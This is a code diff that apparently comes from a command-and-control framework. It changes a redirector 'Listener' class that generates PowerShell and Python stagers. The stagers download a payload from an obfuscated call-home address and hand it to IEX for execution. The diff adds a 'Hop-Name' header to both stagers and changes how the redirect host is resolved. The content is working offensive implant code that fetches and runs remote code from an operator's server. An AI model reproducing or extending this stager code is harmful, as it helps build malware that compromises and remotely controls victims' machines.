@@ -198,6 +198,7 @@ class Listener:
             # add the routing packet to a cookie
             stager += f'$wc.Headers.Add("Cookie","{cookie}={b64RoutingPacket}");'
             stager += f"$ser={helpers.obfuscate_call_home_address(self.host_address)};$t='{stage0}';$hop='{listener_name}';"
+            stager += "$wc.Headers.Add('Hop-Name',$hop);"
             stager += "$data=$wc.DownloadData($ser+$t);"
 
             # decode everything and kick it over to IEX to kick off execution
@@ -248,6 +249,7 @@ class Listener:
                 import urllib.request;
                 UA='{user_agent}';server='{self.host_address}';t='{stage0}';hop='{listener_name}';
                 req=urllib.request.Request(server+t);
+                req.add_header('Hop-Name', hop);
                 """
             )
 
@@ -531,6 +533,7 @@ class Listener:
 
         redirectListenerName = self.options["RedirectListener"]["Value"]
         redirectListenerOptions = data_util.get_listener_options(redirectListenerName)
+        redirectHost = data_util.get_host_address(redirectListenerName)
 
         if not redirectListenerOptions:
             log.error(
@@ -544,7 +547,6 @@ class Listener:
         self.options["DefaultProfile"]["Value"] = redirectListenerOptions.options[
             "DefaultProfile"
         ]["Value"]
-        redirectHost = redirectListenerOptions.host_address
 
         uris = list(self.options["DefaultProfile"]["Value"].split("|")[0].split(","))
 
